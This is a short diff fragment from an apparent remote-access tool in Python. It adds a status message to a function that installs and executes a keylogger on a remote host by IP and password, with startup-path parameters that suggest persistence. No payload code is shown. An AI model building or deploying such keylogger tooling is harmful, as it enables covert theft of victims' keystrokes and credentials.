@@ -125,6 +125,7 @@ def keylogger(ipv4,pword,temp_path,startup_path):
     print("[*] keylogger installed successfully")
     print("\n[+] Executing keylogger...\n")
     remote_command(ipv4,pword,execute_keylogger)
+    print("[*] Keylogger executed successfully...")
 
 def update():
     return
